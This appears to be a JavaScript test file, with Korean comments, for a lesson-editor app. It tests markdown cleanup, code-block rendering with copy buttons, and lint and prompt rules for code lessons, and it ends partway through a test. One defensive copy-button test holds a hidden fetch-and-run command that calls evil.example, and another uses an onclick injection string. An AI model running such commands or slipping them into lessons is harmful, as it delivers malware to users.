// 코드 예제 테스트 (실행: node tests/lesson-code.test.js)
// AI 응답 정리와 화면 그리기가 코드 블록 안의 글을 그대로 두는지, 코드 블록의 언어 이름표·복사 버튼, 코드 예제 지시와 검수를 실제 파일로 확인한다.
// AI 응답만 스텁이다. 화면과 같은 marked와 Turndown을 쓴다. 처음 한 번: npm install --no-save marked@15.0.12 turndown@7.2.4
const fs = require('fs');
const vm = require('vm');
const path = require('path');
const assert = require('assert');

let marked = null;
let TurndownService = null;
try {
    ({ marked } = require('marked'));
    TurndownService = require('turndown');
} catch (err) {
    console.log('FAIL - marked·turndown이 없습니다. 먼저 실행: npm install --no-save marked@15.0.12 turndown@7.2.4');
    process.exit(1);
}

const root = path.join(__dirname, '..', 'js') + path.sep;
const source = file => fs.readFileSync(root + file, 'utf8');
const FILES = ['data.js', 'convention.js', 'lesson-lint.js', 'lesson-opening.js', 'course-meta.js', 'course-qbank.js', 'ai-edit-preview.js', 'lesson-editor-tools.js', 'lesson-review.js', 'lesson-sanitize.js', 'md-toolbar.js', 'lesson-attachments.js', 'tabs.js', 'lesson-pipeline.js', 'ai-routing.js', 'api.js', 'cost-estimate.js'];
const flush = () => new Promise(resolve => setImmediate(resolve));
const reply = (text, finishReason = 'STOP') => ({ candidates: [{ content: { parts: [{ text }] }, finishReason }] });
const plain = value => JSON.parse(JSON.stringify(value));

function fakeElement() {
    const handlers = {};
    return {
        style: {}, dataset: {}, innerHTML: '', textContent: '', className: '', disabled: false, value: '',
        classList: { add() {}, remove() {}, toggle() {}, contains: () => false },
        addEventListener(type, fn) { handlers[type] = fn; },
        fire(type, event) { return handlers[type]?.(event); },
        querySelector: () => fakeElement(),
        querySelectorAll: () => [],
        remove() { this.removed = true; }
    };
}

// review-flow.test.js와 같은 화면 흉내. 화면과 같은 marked를 넣어 api.js가 코드 블록 그리기를 등록하게 한다
function makeContext(callGemini = async () => { throw new Error('호출되면 안 됨'); }) {
    const elements = {};
    const ctx = {
        console: { log() {}, warn() {}, error() {} },
        setTimeout: (fn, ms) => setTimeout(fn, Math.min(ms, 1)), clearTimeout, Promise, URL, Uint16Array, Blob, marked,
        localStorage: { getItem: () => null, setItem() {} },
        currentEditingModuleId: null,
        escapeHtml: s => (typeof s === 'string' ? s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;') : ''),
        saveState: async () => {},
        renderEditor() {}, renderSidebar() {}, showLessonView() {},
        lessonDesignBrief: () => '',
        lessonGenBrief: () => '',
        archiveContent: async () => {},
        alerts: [], toasts: [], overlays: [], taskArgs: [], pipelineCalls: [],
        elements,
        document: {
            readyState: 'complete',
            body: { appendChild: el => { if (el.id) elements[el.id] = el; ctx.overlays.push(el); ctx.onOverlay?.(el); } },
            createElement: fakeElement,
            getElementById: id => elements[id] || null,
            addEventListener() {},
            querySelector: () => null,
            querySelectorAll: () => []
        },
        callGemini
    };
    ctx.window = ctx;
    ctx.showAlert = message => ctx.alerts.push(message);
    ctx.showToast = message => ctx.toasts.push(message);
    vm.createContext(ctx);
    FILES.forEach(file => vm.runInContext(source(file), ctx));
    if (!ctx.confirmAsync) ctx.confirmAsync = async () => true;
    ctx.callGemini = callGemini;
    // 생성 함수가 넘긴 인자를 남긴다. 그림 처리와 이어지는 전체 생성은 흉내만 낸다
    vm.runInContext('callGemini = window.callGemini; buildTaskContext = (task, args) => { window.taskArgs.push({ task, args }); return { systemInstruction: "시스템", userPrompt: `${task}:${args.tabId}` }; }; getEditingModule = (id = window.currentMod?.id) => (String(id) === String(window.currentMod?.id) ? window.currentMod : null); processImageTags = async (mod, md) => md; renderSidebar = () => {}; renderEditor = () => {};', ctx);
    ctx.runLessonPipeline = async (...args) => { ctx.pipelineCalls.push(args); };
    return ctx;
}

function generationContext(callGemini, mod) {
    const ctx = makeContext(callGemini);
    ['editor-loading', 'editor-loading-text', 'editor-loading-stop', 'ai-command-input'].forEach(id => { ctx.elements[id] = fakeElement(); });
    ctx.currentMod = mod;
    vm.runInContext('globalState = { subjects: [] }; currentSubjectId = null;', ctx);
    return ctx;
}

function answerPreview(ctx, action) {
    ctx.onOverlay = overlay => setImmediate(() => overlay.fire('click', { target: { dataset: { diffAction: action } } }));
}

// 프롬프트 빌더(ui.js)를 실제 규칙(data.js)으로 돌린다
function promptContext() {
    const ctx = {
        console: { log() {}, warn() {}, error() {} }, JSON, Map, Set, Promise, Date,
        localStorage: { getItem: () => null, setItem() {} },
        addEventListener() {},
        location: { hash: '' },
        document: { addEventListener() {}, getElementById: () => null, querySelector: () => null, querySelectorAll: () => [], createElement: () => fakeElement(), body: { appendChild() {} } },
        globalState: { subjects: [] }, currentSubjectId: null, courseData: [], instructorTone: 'formal',
        getReferenceContext: () => ''
    };
    ctx.window = ctx;
    vm.createContext(ctx);
    ['data.js', 'lesson-lint.js', 'ui.js'].forEach(file => vm.runInContext(source(file), ctx));
    return ctx;
}

const call = (ctx, name) => vm.runInContext(name, ctx);

let failed = 0;
let count = 0;
async function run(name, fn) {
    count++;
    try {
        await fn();
        console.log(`ok - ${name}`);
    } catch (e) {
        failed++;
        console.log(`FAIL - ${name}\n  ${e.stack || e.message}`);
    }
}

const PYTHON_BLOCK = ['```python', 'def add(a, b):', '    # 값을 더합니다. 결과를 돌려줍니다.', '    return a + b', '1. 첫째 줄', 'print("완료 ✅")', '```'].join('\n');
const YAML_BLOCK = ['```yaml', 'jobs:', '    - name: build', '```'].join('\n');
const BASH_BLOCK = ['```bash', 'ls \\', '  -la', '```'].join('\n');

(async () => {
    const ctx = makeContext();
    const extract = (text, opts) => call(ctx, 'extractText')(reply(text), opts);
    const lint = (md, tabId, opts) => plain(call(ctx, 'lintLessonMarkdown')(md, tabId, opts));
    const msgs = (md, tabId, opts) => lint(md, tabId, opts).map(issue => issue.msg);

    /* ---------- AI 응답 정리 ---------- */
    await run('AI 응답 정리: 코드 블록 안은 받은 그대로 두고 밖의 글만 다듬는다', () => {
        const probe = ['## 함수 (⏱ 30분)', '함수는 값을 돌려줍니다. 다음 예제를 봅니다.', PYTHON_BLOCK, YAML_BLOCK, BASH_BLOCK, '설명입니다. 끝입니다.'].join('\n');
        const out = extract(probe);
        [PYTHON_BLOCK, YAML_BLOCK, BASH_BLOCK].forEach(block => assert.ok(out.includes(block), `코드 블록이 그대로다:\n${block}\n---\n${out}`));
        assert.ok(out.includes('함수는 값을 돌려줍니다.\n다음 예제를 봅니다.'), '코드 밖의 문장은 마침표 뒤에서 나눈다');
        assert.ok(out.includes('설명입니다.\n끝입니다.'));
        assert.ok(out.includes('다음 예제를 봅니다.\n\n```python'), '여는 펜스 앞에는 빈 줄을 둔다');
        assert.ok(out.includes('```\n\n```yaml'), '이어진 코드 블록 사이에도 빈 줄을 둔다');
        assert.ok(!/\n\n```\n/.test(out.replace(/```\n\n```(yaml|bash)/g, '')), '닫는 펜스 앞에 빈 줄을 넣지 않는다');
        assert.strictEqual(extract('글\u00A0입니다.\n```js\nlet a =\u00A01;\n```'), '글&nbsp;입니다.\n\n```js\nlet a = 1;\n```', '코드 안의 특수 공백은 보통 공백으로, 밖은 &nbsp;로');
    });

    await run('AI 응답 정리: 응답 전체를 감싼 펜스만 벗기고 글 중간의 예제는 코드로 둔다', () => {
        assert.strictEqual(extract('```markdown\n## 가\n본문입니다. 다음입니다.\n```'), '## 가\n본문입니다.\n다음입니다.', '```markdown 감싸기는 늘 벗긴다');
        assert.strictEqual(extract('```md\n## 가\n```'), '## 가');
        assert.strictEqual(extract('```\n## 가\n```'), '```\n## 가\n```', '언어 없는 감싸기는 unwrap일 때만');
        assert.strictEqual(extract('```\n## 가\n```', { unwrap: true }), '## 가');
        assert.strictEqual(extract('```markdown\n## 가\n```python\nx = 1\n```\n```'), '## 가\n\n```python\nx = 1\n```', '감싼 안쪽의 코드 블록은 남긴다');
        assert.strictEqual(extract('```markdown\n## 가\n본문입니다.'), '## 가\n본문입니다.', '출력 한도에서 잘려 닫지 못한 감싸기는 여는 줄만 뗀다');
        assert.strictEqual(extract('앞 글입니다. 다음입니다.\n```markdown\n## 예\n```\n뒤 글입니다. 끝입니다.'), '앞 글입니다.\n다음입니다.\n\n```markdown\n## 예\n```\n뒤 글입니다.\n끝입니다.', '중간의 마크다운 예제는 코드로 두고 뒤 글은 다듬는다');
        assert.strictEqual(extract('```markdown\n# 제목\n```\n위 예시는 제목입니다.'), '```markdown\n# 제목\n```\n위 예시는 제목입니다.', '예제 뒤에 설명이 오면 감싸기가 아니다');
        assert.deepStrictEqual(plain(call(ctx, 'safeJSONParse')(extract('```json\n{"a": "가. 나", "b": [1, 2]}\n```'))), { a: '가. 나', b: [1, 2] }, 'JSON 응답은 그대로 읽힌다');
    });

    await run('AI 응답 정리: 감싼 펜스를 닫은 뒤 <!-- END --> 같은 표시만 있으면 감싸기로 보고 표시는 남긴다', () => {
        assert.strictEqual(extract('```markdown\n## 가\n본문입니다.\n```\n<!-- END -->'), '## 가\n본문입니다.\n<!-- END -->', '감싼 교안 전체가 코드 블록으로 보이지 않는다');
        assert.strictEqual(extract('```\n## 가\n```\n\n<!-- CONTINUE -->', { unwrap: true }), '## 가\n\n<!-- CONTINUE -->');
        assert.strictEqual(extract('```\n## 가\n```\n\n<!-- CONTINUE -->'), '```\n## 가\n```\n\n<!-- CONTINUE -->', '언어 없는 감싸기는 unwrap일 때만');
        assert.strictEqual(extract('```markdown\n## 가\n```python\nx = 1\n```\n<!-- CONTINUE -->'), '## 가\n\n```python\nx = 1\n```\n<!-- CONTINUE -->', '잘려 닫지 못한 감싸기의 마지막 펜스는 안쪽 코드를 닫는다');
        assert.strictEqual(extract('```markdown\n# 제목\n```\n위 예시는 제목입니다.'), '```markdown\n# 제목\n```\n위 예시는 제목입니다.', '예제 뒤에 설명이 오면 여전히 감싸기가 아니다');
    });

    await run('코드 블록 닫기: 한 줄에서 여닫는 ```npm install```은 인라인 코드라 코드 블록을 열지 않는다', () => {
        const md = '## 1. 설치 (⏱ 30분)\n\n터미널에서 실행합니다.\n\n```npm install```\n\n설치가 끝났습니다. 다음 단계입니다.';
        assert.strictEqual(call(ctx, 'closeOpenFence')(md), md, '닫는 펜스를 덧붙이지 않는다(덧붙이면 뒤의 글이 코드가 된다)');
        assert.ok(extract(md).endsWith('설치가 끝났습니다.\n다음 단계입니다.'), '뒤의 글도 다듬는다');
        assert.deepStrictEqual(plain(call(ctx, 'lessonFences')(md)), [], '코드 블록으로 세지 않는다');
        assert.ok(call(ctx, 'spokenText')(md).endsWith('npm install 설치가 끝났습니다. 다음 단계입니다.'), '뒤의 글도 낭독 분량에 든다');
    });

    await run('코드 블록 닫기: 글이 코드 블록 안에서 끝나면 여는 펜스 길이로 닫는다', () => {
        const close = call(ctx, 'closeOpenFence');
        assert.strictEqual(close('글\n````python\nx = 1\n'), '글\n````python\nx = 1\n````');
        assert.strictEqual(close('````md\n```\n안쪽\n```'), '````md\n```\n안쪽\n```\n````', '짧은 펜스는 코드의 일부다');
        assert.strictEqual(close('글\n```js\nx\n```'), '글\n```js\nx\n```', '닫힌 글은 그대로');
        assert.strictEqual(close('글입니다.'), '글입니다.');
    });

    await run('마크다운 정리: 대괄호로 감싼 코드 예제 지시 줄만 지운다', () => {
        const clean = call(ctx, 'sanitizeMarkdownContent');
        const out = clean('## 반복문\n\n[코드 예제 — 이 차시는 코드를 다룹니다]\n\n설명입니다.\n\n```text\n[코드 예제 — 코드 안]\n```');
        assert.ok(!out.includes('[코드 예제 — 이 차시는'), out);
        assert.ok(out.includes('설명입니다.') && out.includes('[코드 예제 — 코드 안]'), '본문과 코드 안은 둔다');
        assert.ok(clean('## 코드 예제 — 반복문\n\n설명입니다.').includes('## 코드 예제 — 반복문'), '대괄호 없는 제목은 둔다');
    });

    /* ---------- 화면 그리기 ---------- */
    await run('화면 전처리: 코드 블록 안의 # 줄과 번호 줄을 건드리지 않는다', () => {
        const md = '개요 (Overview)\n본문입니다.\n```python\nx = 1\n# 주석\n```\n```text\n가. 2. 다음\n```\n본문입니다.\n## 제목';
        const out = call(ctx, 'preprocessMarkdown')(md);
        assert.ok(out.includes('```python\nx = 1\n# 주석\n```'), out);
        assert.ok(out.includes('```text\n가. 2. 다음\n```'), out);
        assert.ok(out.startsWith('개요\n') && out.includes('본문입니다.\n\n## 제목'), '코드 밖은 전처리한다');
    });

    await run('화면 후처리: <pre> 안의 ** 와 이모지, 줄 끝 \\ 를 바꾸지 않는다', () => {
        const pre = '<pre><code>x = a**2 + b**2\nprint("완료 ✅") 💡 다음\nls \\\n</code></pre>';
        const out = call(ctx, 'postprocessHtml')(`<p>설명 **굵게** 입니다.</p>${pre}`);
        assert.ok(out.includes(pre), out);
        assert.ok(out.includes('<strong>굵게</strong>'), '코드 밖은 후처리한다');
    });

    await run('그림 자리 넣기: 코드 블록 안의 ## 줄은 제목이 아니고 그 안의 그림 태그는 그림이 아니다', () => {
        const inject = call(ctx, 'autoInjectImageTags');
        const md = '## 진짜 제목\n\n본문입니다.\n\n```python\n## 주석\nx = 1\n```';
        const out = inject(md);
        assert.strictEqual((out.match(/\[IMG:/g) || []).length, 1, out);
        assert.ok(out.includes('<!-- [IMG: "진짜 제목"] -->') && !out.includes('[IMG: "주석"]'));
        assert.ok(out.includes('```python\n## 주석\nx = 1\n```'), '코드는 그대로');
        const coded = inject('## 그림 없는 섹션\n\n```html\n<!-- [IMG: "코드 속 태그"] -->\n```');
        assert.ok(coded.includes('<!-- [IMG: "그림 없는 섹션"] -->'), '코드 속 태그는 그림으로 세지 않는다');
    });

    await run('코드 블록 그리기: 언어 이름표와 글자 없는 복사 버튼, 코드는 이스케이프', () => {
        const html = call(ctx, 'lessonCodeBlockHtml')('a < b && "x"', 'py');
        assert.ok(html.startsWith('<div class="lesson-code" data-lang="Python">'), html);
        assert.ok(html.includes('<pre><code class="language-py">a &lt; b &amp;&amp; &quot;x&quot;</code></pre>'), html);
        assert.ok(html.includes('data-lesson-action="copy-code"') && html.includes('aria-label="코드 복사"') && html.includes('type="button"'));
        assert.ok(/<button[^>]*><i [^>]*><\/i><\/button>/.test(html), '버튼에는 글자가 없다(블록 글자가 코드와 같다)');
        assert.ok(!/\son[a-z]+=/i.test(html), '인라인 처리기를 쓰지 않는다');
        const label = (code, info) => (call(ctx, 'lessonCodeBlockHtml')(code, info).match(/data-lang="([^"]*)"/) || [])[1];
        assert.strictEqual(label('82.3', 'text'), '실행 결과');
        assert.strictEqual(label('$ ls', 'console'), '실행 결과');
        assert.strictEqual(label('# 제목', 'md'), 'Markdown');
        assert.strictEqual(label('a', 'cs'), 'C#');
        assert.strictEqual(label('a', 'Kotlin'), 'Kotlin');
        assert.strictEqual(label('a', 'constructor'), 'constructor', '이름 목록의 기본 속성을 이름으로 쓰지 않는다');
        assert.strictEqual(label('a', 'gdscript extra'), 'GDScript', '언어 표기의 첫 낱말만 쓴다');
        const bare = call(ctx, 'lessonCodeBlockHtml')('x', '');
        assert.ok(bare.includes('data-lang="코드"') && bare.includes('<pre><code>x</code></pre>'), bare);
        const hostile = call(ctx, 'lessonCodeBlockHtml')('x', 'x" onclick=alert(1)');
        assert.ok(hostile.includes('data-lang="코드"') && hostile.includes('<pre><code>x</code></pre>') && !hostile.includes('onclick'), hostile);
    });

    await run('코드 블록 그리기: marked가 코드 블록을 이름표 상자로, mermaid는 다이어그램으로 그리고 후처리 뒤에도 코드가 같다', () => {
        const md = '설명입니다.\n\n```python\nx = a**2 + b**2\nprint("완료 ✅")\n# 주석\n```\n\n```mermaid\nflowchart LR\nA-->B\n```';
        const html = call(ctx, 'postprocessHtml')(call(ctx, 'markTermParagraphs')(marked.parse(call(ctx, 'preprocessMarkdown')(md))));
        assert.ok(html.includes('<div class="lesson-code" data-lang="Python">'), html);
        assert.ok(html.includes('<pre><code class="language-python">x = a**2 + b**2\nprint(&quot;완료 ✅&quot;)\n# 주석</code></pre>'), html);
        assert.ok(html.includes('<div class="mermaid">') && !/data-lang="mermaid"/i.test(html), 'mermaid는 그대로 다이어그램');
    });

    await run('코드 복사: 교안 화면의 버튼은 코드만 복사하고 알린다. 실패하면 직접 고르라고 알린다', async () => {
        const listeners = {};
        const toasts = [];
        const copied = [];
        const sctx = { console: { warn() {} }, document: { addEventListener: (type, fn) => { listeners[type] = fn; } } };
        sctx.window = sctx;
        sctx.showToast = (text, kind) => toasts.push([text, kind]);
        sctx.copyPlainText = async text => { copied.push(text); };
        vm.createContext(sctx);
        vm.runInContext(source('lesson-sanitize.js'), sctx);
        const code = 'print("완료")\nx = 1';
        const box = { querySelector: sel => (sel === 'pre code' ? { textContent: code } : null) };
        const button = inView => ({ dataset: { lessonAction: 'copy-code' }, closest: sel => ({ '.lesson-code': box, '#render-view': inView ? {} : null }[sel] ?? null) });
        const click = target => listeners.click({ target: { closest: sel => (sel === '[data-lesson-action]' ? target : null) } });
        click(button(true));
        await flush();
        assert.deepStrictEqual(copied, [code]);
        assert.deepStrictEqual(toasts.at(-1), ['코드를 복사했습니다.', 'success']);
        sctx.copyPlainText = async () => { throw new Error('막힘'); };
        click(button(true));
        await flush();
        assert.deepStrictEqual(toasts.at(-1), ['복사하지 못했습니다. 코드를 끌어 골라 복사해 주세요.', 'warning']);
        const seen = toasts.length;
        sctx.copyPlainText = async text => { copied.push(text); };
        click(button(false));
        await flush();
        assert.strictEqual(toasts.length, seen, '교안 화면 밖(작업 기록·미리보기)의 버튼은 움직이지 않는다');
        assert.strictEqual(copied.length, 1);
        // 남이 준 교안에 HTML로 넣은 코드 상자: 안에 다른 요소(숨긴 글)가 든 블록은 복사하지 않는다(앱이 그린 블록은 글자만 담는다)
        const hidden = { textContent: 'npm install game-kit && curl -s https://evil.example/x -o x && node x', children: [{ nodeName: 'SPAN' }] };
        const crafted = { querySelector: sel => (sel === 'pre code' ? hidden : null) };
        click({ dataset: { lessonAction: 'copy-code' }, closest: sel => ({ '.lesson-code': crafted, '#render-view': {} }[sel] ?? null) });
        await flush();
        assert.strictEqual(copied.length, 1, '숨긴 글까지 복사하지 않는다');
        assert.deepStrictEqual(toasts.at(-1), ['이 코드 블록은 앱이 만든 모양이 아니라 복사하지 않았습니다. 코드를 끌어 골라 복사해 주세요.', 'warning']);
    });

    await run('코드 복사: 화면과 같은 marked와 교안 정리를 거친 앱의 코드 블록은 글자만 담고, HTML로 넣은 상자의 숨긴 span은 그대로 남아 복사를 막는다', () => {
        const ctx = makeContext();
        const app = call(ctx, 'lessonCodeBlockHtml')('npm install game-kit', 'bash');
        assert.ok(/<pre><code class="language-bash">npm install game-kit<\/code><\/pre>/.test(app), '앱의 블록은 code 안에 다른 태그가 없다');
    });

    await run('내보내기 서식: 코드 블록 이름표를 넣고 인쇄할 때 쪽에서 나누지 않는다', () => {
        const ectx = { console, window: {}, document: {}, LESSON_TABS: [] };
        vm.createContext(ectx);
        vm.runInContext(source('lesson-export.js'), ectx);
        const css = vm.runInContext('LESSON_EXPORT_CSS', ectx);
        ['.lesson-code {', '.lesson-code > pre', 'attr(data-lang)', '.lesson-code { break-inside: avoid; }'].forEach(rule => assert.ok(css.includes(rule), rule));
        assert.ok(vm.runInContext('EXPORT_CONTROLS', ectx).includes('[data-lesson-action]'), '복사 버튼은 내보내기에서 뗀다');
    });

    await run('예전 HTML 다시 불러오기: 이름표를 단 코드 블록은 코드 펜스로 되돌린다', () => {
        const octx = { console, window: {} };
        vm.createContext(octx);
        vm.runInContext(source('output-old-html.js'), octx);
        const service = call(octx, 'oldHtmlService')(TurndownService);
        const md = service.turndown('<p>앞 글</p><div class="lesson-code" data-lang="Python"><button type="button" class="lesson-code-copy" data-lesson-action="copy-code"></button><pre><code class="language-python">def add(a, b):\n\n    return a + b\n</code></pre></div><p>뒤 글</p>');
        assert.ok(md.includes('```python\ndef add(a, b):\n\n    return a + b\n```'), md);
        assert.ok(!md.includes('lesson-code') && !md.includes('<div'), 'HTML로 남기지 않는다(코드의 빈 줄을 지키려고)');
    });

    /* ---------- 코드를 다루는 차시와 검수 ---------- */
    await run('코드 차시 알아보기: 제목·사용 툴·교안의 코드 블록으로 판단한다', () => {
        const topic = call(ctx, 'lessonCodeTopic');
        assert.strictEqual(topic({ title: 'Python 반복문' }), true);
        assert.strictEqual(topic({ title: '씬 구성', tools: [{ name: 'Unity' }] }), true);
        assert.strictEqual(topic({ title: '데이터를 고르는 쿼리' }), true);
        assert.strictEqual(topic({ title: '게임 기획 문서 작성' }), false);
        assert.strictEqual(topic({ title: '기획서', keyConcepts: ['GitHub 협업'] }), false, '다른 영문자에 붙은 이름은 보지 않는다');
        assert.strictEqual(topic({ title: '게임 기획', tabContents: { basicLearn: '## 예\n\n```python\nx = 1\n```' } }), true, '교안에 코드 블록이 있으면');
        assert.strictEqual(topic({ title: '게임 기획', tabContents: { basicLearn: '```mermaid\nflowchart LR\n```' } }), false, '다이어그램은 코드가 아니다');
        assert.strictEqual(topic(null), false);
        // 과정 설계의 공통 툴도 본다(course-design.js lessonTools)
        const dctx = { console, window: {}, globalState: { courseDesign: { tools: [{ name: 'Unity', version: '6' }] } } };
        vm.createContext(dctx);
        ['lesson-lint.js', 'course-design.js'].forEach(file => vm.runInContext(source(file), dctx));
        assert.strictEqual(call(dctx, 'lessonCodeTopic')({ title: '씬 구성' }), true);
    });

    await run('코드 신호와 예제: 인라인 코드와 코드 말을 세고, 실행 결과·다이어그램은 예제로 세지 않는다', () => {
        const signals = call(ctx, 'lessonCodeSignals');
        assert.strictEqual(signals('`print()`와 `x = 1`을 씁니다.'), true);
        assert.strictEqual(signals('함수와 `total`을 씁니다.'), true);
        assert.strictEqual(signals('함수와 변수가 코드를 이룹니다.'), true);
        assert.strictEqual(signals('함수를 씁니다.'), false);
        assert.strictEqual(signals('`점수`를 정합니다.'), false, '한글뿐인 인라인 코드는 코드 같지 않다');
        assert.strictEqual(signals('```python\nprint(1)\nx = 2\n```'), false, '코드 블록 안은 세지 않는다');
        const example = call(ctx, 'lessonHasCodeExample');
        assert.strictEqual(example('```python\nx = 1\n```'), true);
        assert.strictEqual(example('```\nx = 1\n```'), true, '언어 없는 코드 블록도 예제다(언어는 따로 지적한다)');
        assert.strictEqual(example('```text\n82.3\n```\n\n```mermaid\nflowchart LR\n```'), false);
    });

    const CODE_MD = [
        '# 📝 반복문', '',
        '## 학습 목표', '', '- 반복문으로 합계를 구하는 코드를 작성할 수 있습니다.', '',
        '## 개요 (⏱ 10분)', '', '- `for` 문과 `range()`로 값을 셉니다.', '',
        '## 1. 반복문의 구조 (⏱ 60분)', '', '반복문은 `for` 키워드로 시작합니다. `range(3)`은 0부터 2까지 셉니다.', '',
        '## 2. 예제로 보기 (⏱ 60분)', '', '합계를 구하는 반복문입니다.', '', '```python', 'total = 0', 'for n in range(3):', '    total += n', '```', '',
        '## 3. 언어를 적지 않은 블록 (⏱ 30분)', '', '```', 'x = 1', '```', '',
        '## 4. 다이어그램만 (⏱ 30분)', '', '함수와 변수, 코드의 흐름을 봅니다.', '', '```mermaid', 'flowchart LR', 'A-->B', '```', '',
        '## ✅ 학습 후 체크리스트', '', '- 합계를 구했습니다. (다시 보기: 2. 예제로 보기)', '',
        '## 5. 닫지 않은 블록 (⏱ 30분)', '', '```js', 'let a = 1;'
    ].join('\n');

    await run('검수: 코드 차시에서만 예제 없는 코드 섹션, 언어 없는 블록, 닫지 않은 블록을 권장으로 알린다', () => {
        const issues = lint(CODE_MD, 'basicLearn', { codeTopic: true });
        const where = msg => issues.filter(issue => issue.msg === msg).map(issue => issue.where);
        assert.deepStrictEqual(where('코드를 설명하면 예제 코드 블록을 함께 둡니다.'), ['1. 반복문의 구조 (⏱ 60분)', '4. 다이어그램만 (⏱ 30분)'], '목표·개요·체크리스트와 예제가 있는 섹션은 빼고 mermaid는 예제가 아니다');
        assert.deepStrictEqual(where('코드 블록에 언어를 적습니다.'), ['3. 언어를 적지 않은 블록 (⏱ 30분)']);
        assert.strictEqual(issues.find(issue => issue.msg === '코드 블록에 언어를 적습니다.').snip, 'x = 1');
        assert.deepStrictEqual(where('닫히지 않은 코드 블록이 있습니다.'), ['5. 닫지 않은 블록 (⏱ 30분)']);
        assert.ok(issues.filter(issue => /코드/.test(issue.msg)).every(issue => issue.sev === 'warn'), '모두 권장이다');
        assert.ok(issues.find(issue => issue.where === '1. 반복문의 구조 (⏱ 60분)').snip.includes('`for`'), '근거를 보인다');
        const plainLint = msgs(CODE_MD, 'basicLearn');
        ['코드를 설명하면 예제 코드 블록을 함께 둡니다.', '코드 블록에 언어를 적습니다.', '닫히지 않은 코드 블록이 있습니다.'].forEach(msg => assert.ok(!plainLint.includes(msg), `코드 차시가 아니면 ${msg}`));
        const assessment = msgs(CODE_MD, 'assessment', { codeTopic: true });
        assert.ok(!assessment.includes('코드를 설명하면 예제 코드 블록을 함께 둡니다.') && assessment.includes('코드 블록에 언어를 적습니다.'), '학습이해도는 예제를 요구하지 않는다');
        assert.deepStrictEqual(plain(call(ctx, 'lessonRequiredIssues')({ tabContents: { basicLearn: CODE_MD } })).filter(issue => /코드/.test(issue.msg)), [], '차시 목록 배지(필수)는 그대로');
    });

    await run('검수 규칙 목록: 코드 예제 두 줄을 끝에 붙이고 안내를 고친다', () => {
        const rows = call(ctx, 'LESSON_RULE_LIST');
        assert.deepStrictEqual(plain(rows.slice(-2).map(row => [row.sev, row.area, row.rule])), [
            ['warn', '코드 예제', '코드를 설명하면 예제 코드 블록을 함께 둡니다.'], ['warn', '코드 예제', '코드 블록에 언어를 적고 닫습니다.']
        ]);
        assert.ok(call(ctx, 'LESSON_RULE_NOTE').includes('코드 예제 규칙은 코드를 다루는 차시에만 검사합니다.'));
    });

    await run('검수 문맥: 코드 차시에만 codeTopic을 준다', () => {
        const context = (mod, tabId) => plain(call(ctx, 'lessonLintContext')(mod, tabId));
        assert.deepStrictEqual(context({ id: 1, title: 'Python 반복문', tabContents: {} }, 'basicLearn'), { codeTopic: true });
        assert.deepStrictEqual(context({ id: 1, title: '게임 기획', tabContents: {} }, 'basicLearn'), {});
        assert.deepStrictEqual(context({ id: 1, title: 'Python 반복문', tabContents: {}, objectives: ['합계를 구하는 코드를 작성할 수 있습니다.'] }, 'assessment'), { objectiveCount: 1, codeTopic: true });
    });

    /* ---------- 생성 지시 ---------- */
    const pctx = promptContext();
    const build = (task, args) => call(pctx, 'buildTaskContext')(task, { title: 'Python 반복문', description: '반복문', keyConcepts: [], ...args });

    await run('지시: 코드 예제 규칙은 학습이해도를 뺀 탭 규칙과 교안 전체 규칙에 들어간다', () => {
        const rules = call(pctx, 'CONTEXT_CORE').rules;
        assert.ok(rules.code_examples.startsWith('[코드 예제 규칙]') && rules.code_examples.includes('```python'));
        assert.ok(!rules.text_emphasis.includes('단축키') && rules.text_emphasis.includes('언어를 적은 코드 블록'));
        const fewshot = call(pctx, 'CONTEXT_CORE').fewshot_cases;
        assert.ok(!fewshot.includes('단축키') && fewshot.includes('```python\n# 점수 목록의 평균을 구해 출력합니다\nscores = [80, 92, 75]  # 학생 세 명의 점수') && fewshot.includes('```text\n82.3\n```'));
        ['basicLearn', 'basicPrac', 'advLearn', 'advPrac'].forEach(tabId => assert.ok(call(pctx, 'buildTabRules')(tabId, []).includes('[코드 예제 규칙]'), tabId));
        assert.ok(!call(pctx, 'buildTabRules')('assessment', []).includes('[코드 예제 규칙]'), '학습이해도는 코드제출 형식을 따로 쓴다');
        assert.ok(build('module', {}).systemInstruction.includes('[코드 예제 규칙]'), '교안 전체 생성');
        assert.ok(build('module_continue', { chunkIndex: 2, previousContent: '앞 글' }).systemInstruction.includes('[코드 예제 규칙]'));
    });

    await run('지시: 코드 차시의 탭 생성·이어쓰기·교안 전체 생성에 코드 예제 지시를 붙인다', () => {
        const head = '[코드 예제 — 이 차시는 코드를 다룹니다]';
        const learn = build('tab_content', { tabId: 'basicLearn', tabLabel: '기본학습', codeTopic: true }).userPrompt;
        assert.ok(learn.includes(head) && learn.includes('개념 설명 바로 뒤에 예제 코드 블록을 둡니다.') && learn.includes('학습 목표, 개요, 학습 후 체크리스트에는 코드를 넣지 않습니다.'), learn.slice(-600));
        assert.ok(learn.indexOf(head) > learn.indexOf('[탭 작성 지시]'), '탭 작성 지시 뒤에 붙인다');
        const prac = build('tab_content', { tabId: 'basicPrac', tabLabel: '기본실습', codeTopic: true }).userPrompt;
        assert.ok(prac.includes(head) && prac.includes('실습 단계마다 입력할 코드를'), '실습 탭은 단계마다 입력할 코드');
        assert.ok(!build('tab_content', { tabId: 'basicLearn', tabLabel: '기본학습' }).userPrompt.includes(head), '코드 차시가 아니면 붙이지 않는다');
        const quiz = build('tab_content', { tabId: 'assessment', tabLabel: '학습이해도', codeTopic: true });
        assert.ok(!quiz.userPrompt.includes(head) && !quiz.systemInstruction.includes('[코드 예제 규칙]'), '학습이해도에는 붙이지 않는다');
        assert.ok(build('tab_content_continue', { tabId: 'advPrac', tabLabel: '심화실습', codeTopic: true, chunkIndex: 1, previousContent: '앞 글' }).userPrompt.includes('실습 단계마다 입력할 코드를'));
        assert.ok(!build('tab_content_continue', { tabId: 'assessment', tabLabel: '학습이해도', codeTopic: true, chunkIndex: 1, previousContent: '앞 글' }).userPrompt.includes(head));
        assert.ok(build('module', { codeTopic: true }).userPrompt.includes('개념 설명 바로 뒤에 예제 코드 블록을 둡니다.'));
        assert.ok(build('module_continue', { codeTopic: true, chunkIndex: 2, previousContent: '앞 글' }).userPrompt.includes(head));
        assert.ok(!build('module', {}).userPrompt.includes(head));
    });

    await run('지시: 나눠 받을 때 코드 블록 안에서 끊지 않게 한다', () => {
        const cut = '문장 중간이나 코드 블록 안에서 끊지 마세요.';
        assert.ok(build('tab_content', { tabId: 'basicPrac', tabLabel: '기본실습' }).systemInstruction.includes(cut));
